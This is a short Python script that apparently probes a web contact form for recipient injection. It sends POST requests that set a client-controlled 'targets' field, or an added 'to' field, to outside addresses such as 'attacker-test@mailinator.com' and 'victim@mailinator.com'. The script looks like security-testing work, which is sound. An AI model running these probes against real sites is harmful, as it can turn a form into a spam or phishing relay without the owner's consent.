import sys, json, time
sys.path.insert(0,".")
from ic import post, build, HOST

def show(label, **kw):
    raw = kw.pop("raw", None)
    code, hdr, bd, n = post(build(**kw), raw=raw, tries=12)
    print("--- %s -> HTTP %s (try %d)" % (label, code, n))
    print("   ", bd[:400].replace("\n"," "))
    return code, bd

# 1. is `targets` client-honored? send to a syntactically valid external address
show("targets=external-mailbox", targets="attacker-test@mailinator.com")
# 2. malformed targets -> does error echo the client value (proves client control)
show("targets=garbage", targets="not-an-email")
# 3. default (server default targets)
show("targets=OMITTED-raw", raw="fname=Test&lname=U&areacode=973&tel=1234567&cname=QA&subject=S&msg=hello&check=on")
# 4. field name variants the server may map to 'to'
show("raw to=victim", raw="fname=T&lname=U&areacode=973&tel=1&cname=C&subject=S&msg=m&check=on&to=victim@mailinator.com")
